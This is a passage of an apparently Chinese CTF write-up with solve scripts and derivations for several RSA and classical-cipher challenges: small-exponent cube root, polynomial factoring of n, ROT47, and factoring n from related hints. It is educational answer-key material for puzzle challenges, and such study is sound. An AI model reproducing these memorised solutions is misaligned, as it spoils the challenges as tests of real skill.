crypto-RSA签到</h2><p>看上去很复杂，根据c的位数以及flag的位数，e=3,小明文攻击，我们直接对c开3次方即可，一开始还真没看出来，傻傻的在想。。。。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">42336544435252811021843650684098817755849747192874682997240960601474927692351510022965782272751339319782351146077580929125</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(gmpy2.iroot(c,<span class="number">3</span>)[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure><h2 id="crypto-ezrsa涨见识了"><a class="markdownIt-Anchor" href="#crypto-ezrsa涨见识了"></a> crypto-ezRSA(涨见识了)</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>(<span class="params">nbit = <span class="number">64</span></span>):</span><br><span class="line"> <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  k = getRandomNBitInteger(nbit)</span><br><span class="line">  p = k**<span class="number">6</span> + <span class="number">7</span>*k**<span class="number">4</span> - <span class="number">40</span>*k**<span class="number">3</span> + <span class="number">12</span>*k**<span class="number">2</span> - <span class="number">114</span>*k + <span class="number">31377</span></span><br><span class="line">  q = k**<span class="number">5</span> - <span class="number">8</span>*k**<span class="number">4</span> + <span class="number">19</span>*k**<span class="number">3</span> - <span class="number">313</span>*k**<span class="number">2</span> - <span class="number">14</span>*k + <span class="number">14011</span></span><br><span class="line">  <span class="keyword">if</span> isPrime(p) <span class="keyword">and</span> isPrime(q):</span><br><span class="line">   <span class="keyword">return</span> p, q</span><br></pre></td></tr></table></figure><p>polyRSA——解单变量多项式方程</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line">n = <span class="number">1901485114700245088118015176838411045645808657633721129158322425051110390237801115516544893309422501851747092251796770953642000579931231478667887589988786560834446696408732292786254192492281586457284980263740183</span></span><br><span class="line">k = var(<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">p = k**<span class="number">6</span> + <span class="number">7</span>*k**<span class="number">4</span> - <span class="number">40</span>*k**<span class="number">3</span> + <span class="number">12</span>*k**<span class="number">2</span> - <span class="number">114</span>*k + <span class="number">31377</span></span><br><span class="line">q = k**<span class="number">5</span> - <span class="number">8</span>*k**<span class="number">4</span> + <span class="number">19</span>*k**<span class="number">3</span> - <span class="number">313</span>*k**<span class="number">2</span> - <span class="number">14</span>*k + <span class="number">14011</span></span><br><span class="line">polys = (p * q == n)</span><br><span class="line"><span class="built_in">print</span>(solve(polys, k))</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">1901485114700245088118015176838411045645808657633721129158322425051110390237801115516544893309422501851747092251796770953642000579931231478667887589988786560834446696408732292786254192492281586457284980263740183</span></span><br><span class="line">enc = <span class="number">1199361436656854951826843585559905358018072076349745598865984504434921942249797269971584270541920348511243191511578321283455075109027873358983934024677982086699270397304699932717071144314481599892879445599516848</span></span><br><span class="line">k = <span class="number">13070168166947995246</span></span><br><span class="line">p = k**<span class="number">6</span> + <span class="number">7</span>*k**<span class="number">4</span> - <span class="number">40</span>*k**<span class="number">3</span> + <span class="number">12</span>*k**<span class="number">2</span> - <span class="number">114</span>*k + <span class="number">31377</span></span><br><span class="line">q = k**<span class="number">5</span> - <span class="number">8</span>*k**<span class="number">4</span> + <span class="number">19</span>*k**<span class="number">3</span> - <span class="number">313</span>*k**<span class="number">2</span> - <span class="number">14</span>*k + <span class="number">14011</span></span><br><span class="line">d = inverse(<span class="number">31337</span>, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes((<span class="built_in">pow</span>(enc, d, n))))</span><br></pre></td></tr></table></figure><h2 id="crypto-埃塞克的秘密"><a class="markdownIt-Anchor" href="#crypto-埃塞克的秘密"></a> crypto-埃塞克的秘密</h2><p>埃塞克，即ASCII，此处的ROT，我们试出是ROT47</p><h2 id="crypto-babyhint"><a class="markdownIt-Anchor" href="#crypto-babyhint"></a> crypto-babyhint</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">hint1=<span class="built_in">pow</span>(<span class="number">2023</span>*p+<span class="number">2022</span>*q,<span class="number">1919</span>,n)</span><br><span class="line">hint2=<span class="built_in">pow</span>(<span class="number">2022</span>*p+<span class="number">2023</span>*q,<span class="number">9191</span>,n)</span><br></pre></td></tr></table></figure><p>关键在于怎么利用它来求出pq<br />这两个式子有一定的对称性，1919跟9191又有一定的关联<br />对两个式子进行运算操作，最终得出pq<br />多利用n=p*q,指数运算等</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">h1= <span class="number">83535799515204730191288403119559179388147974968301357768644756769205396635068662150926873512812305514469213626273460486537390422570056287512841114712846420160416446291128064734960979586229744062965998582728378025151822479630618024804808407804317029367335421715125562402059266983021662398390585435529976586654</span></span><br><span class="line">h2= <span class="number">14402204438484882372730843813561914135941866642278909172674395293274736617425618184831446215507756031454895377588951726822765439585979555636320832177929472057402274116190878688601329765374509467243968967279090492272317903230101551317377700802837187081510381677262879617929177970455244249498674083943925477229</span></span><br><span class="line">n= <span class="number">94120719816617297967197808458007462810449143149204454740678593087096770130918870563878599847276923902207042790106345400843990455347835029220453217996810995363105274873857381469314548191574754245357568090646094043040797653858225598519876785530143007788084656262253002478643994943076851585839631209338814367691</span></span><br><span class="line">c= <span class="number">84244594789418833202484965138308516535996015903654462304986953156471594657993252593373963514364258027091543394305491354187806441313428473670956684437253991594327692679733432489342255718685303997647293213324463025120804679847465190496542879161344985402542539184706559207299026102682674060562738496314731555616</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">k = <span class="number">19</span> * <span class="number">101</span> * <span class="number">91</span></span><br><span class="line">h5 = <span class="built_in">pow</span>(h1,<span class="number">91</span>,n)*<span class="built_in">pow</span>(<span class="number">2022</span>,k,n)-<span class="built_in">pow</span>(h2,<span class="number">19</span>,n)*<span class="built_in">pow</span>(<span class="number">2023</span>,k,n)</span><br><span class="line">h6 = <span class="built_in">pow</span>(h1,<span class="number">91</span>,n)*<span class="built_in">pow</span>(<span class="number">2023</span>,k,n)-<span class="built_in">pow</span>(h2,<span class="number">19</span>,n)*<span class="built_in">pow</span>(<span class="number">2022</span>,k,n)</span><br><span class="line">k1 = inverse(<span class="built_in">pow</span>(<span class="number">2022</span>,<span class="number">2</span>*k,n)-<span class="built_in">pow</span>(<span class="number">2023</span>,<span class="number">2</span>*k,n), n)</span><br><span class="line">k2 = inverse(<span class="built_in">pow</span>(<span class="number">2023</span>,<span class="number">2</span>*k,n)-<span class="built_in">pow</span>(<span class="number">2022</span>,<span class="number">2</span>*k,n), n)</span><br><span class="line">h3 = h5 * k1 % n</span><br><span class="line">h4 = h6 * k2 % n</span><br><span class="line">q = gmpy2.gcd(h3, n)</span><br><span class="line">p = gmpy2.gcd(h4, n)</span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2 id="crypto-ezmath"><a class="markdownIt-Anchor" href="#crypto-ezmath"></a> crypto-ezmath</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">hint = <span class="built_in">pow</span>(<span class="number">2022</span> * p + <span class="number">2023</span>, q, n)</span><br><span class="line"></span><br><span class="line">p = gmpy2.gcd(n,hint-<span class="built_in">pow</span>(<span class="number">2023</span>,n,n))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>2022</mn><mi>p</mi><mo>+</mo><mn>2023</mn><msup><mo stretchy="false">)</mo><mi>q</mi></msup><mo>=</mo><mi>k</mi><mi>n</mi><mo>+</mo><mi>h</mi></mrow><annotation encoding="application/x-tex">(2022p+2023)^{q}=kn+h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">2</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">3</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>两边同时模</mtext><mi>p</mi><mo separator="true">,</mo><mo stretchy="false">(</mo><mtext>二项式定理</mtext><mo stretchy="false">)</mo><mtext>得到：</mtext><mi>h</mi><mo>≡</mo><mn>202</mn><msup><mn>3</mn><mi>q</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">两边同时模p,(二项式定理)得到：h\equiv2023^{q}mod\ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">两</span><span class="mord cjk_fallback">边</span><span class="mord cjk_fallback">同</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">模</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord cjk_fallback">二</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">理</span><span class="mclose">)</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">：</span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>202</mn><msup><mn>3</mn><mi>n</mi></msup><mo>=</mo><mn>202</mn><msup><mn>3</mn><mrow><mi>p</mi><mi>q</mi></mrow></msup><mo>≡</mo><mn>202</mn><msup><mn>3</mn><mi>q</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">2023^{n}=2023^{pq}\equiv2023^{q}mod\ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mi>p</mi><mo>=</mo><mi>h</mi><mo>−</mo><mn>202</mn><msup><mn>3</mn><mi>n</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">kp=h-2023^{n}mod\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>=</mo><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo separator="true">,</mo><mi>k</mi><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p=gcd(n,kp)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></p><p>类似题目还有<br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mn>1</mn><mo>=</mo><mo stretchy="false">(</mo><mn>2020</mn><mi>p</mi><mn>1</mn><mo>+</mo><mi>q</mi><mn>1</mn><msup><mo stretchy="false">)</mo><mn>202020</mn></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mn>1</mn></mrow><annotation encoding="application/x-tex">h1=(2020p1+q1)^{202020}mod\ n1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">0</span><span class="mord mathnormal">p</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span><span class="mord">1</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mn>2</mn><mo>=</mo><mo stretchy="false">(</mo><mn>2021</mn><mi>p</mi><mn>1</mn><mo>+</mo><mn>212121</mn><msup><mo stretchy="false">)</mo><mrow><mi>q</mi><mn>1</mn></mrow></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mn>1</mn></mrow><annotation encoding="application/x-tex">h2=(2021p1+212121)^{q1}mod\ n1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">1</span><span class="mord mathnormal">p</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord">1</span><span class="mord">2</span><span class="mord">1</span><span class="mord">2</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span><span class="mord">1</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mn>1</mn><mo>∗</mo><mn>202</mn><msup><mn>1</mn><mn>202020</mn></msup><mo>=</mo><mo stretchy="false">(</mo><mn>2020</mn><mi>p</mi><mn>1</mn><mo>+</mo><mi>q</mi><mn>1</mn><msup><mo stretchy="false">)</mo><mn>202020</mn></msup><mo>∗</mo><mn>202</mn><msup><mn>1</mn><mn>202020</mn></msup><mo>≡</mo><mo stretchy="false">(</mo><mn>2020</mn><mo>∗</mo><mn>2021</mn><mo>∗</mo><mi>p</mi><mn>1</mn><msup><mo stretchy="false">)</mo><mn>202020</mn></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>q</mi><mn>1</mn><mo stretchy="false">(</mo><mtext>二项式定理展开</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">h1*2021^{202020}=(2020p1+q1)^{202020}*2021^{202020}\equiv(2020*2021*p1)^{202020}mod\ q1(二项式定理展开)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">0</span><span class="mord mathnormal">p</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord">1</span><span class="mopen">(</span><span class="mord cjk_fallback">二</span><span class="mord cjk_fallback">项</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">展</span><span class="mord cjk_fallback">开</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>2020</mn><mo>∗</mo><mo stretchy="false">(</mo><mi>h</mi><mn>2</mn><mo>−</mo><mn>212121</mn><mo stretchy="false">)</mo><msup><mo stretchy="false">)</mo><mn>202020</mn></msup><mo>≡</mo><mo stretchy="false">(</mo><mn>2020</mn><mo>∗</mo><mn>2021</mn><mo>∗</mo><mi>p</mi><mn>1</mn><msup><mo stretchy="false">)</mo><mn>202020</mn></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>q</mi><mn>1</mn><mo stretchy="false">(</mo><mtext>二项式展开，同时模</mtext><mi>q</mi><mn>1</mn><mtext>即可</mtext><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(2020*(h2-212121))^{202020}\equiv(2020*2021*p1)^{202020}mod\ q1(二项式展开，同时模q1即可)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">h</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord">1</span><span class="mord">2</span><span class="mord">1</span><span class="mord">2</span><span class="mord">1</span><span class="mclose">)</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span 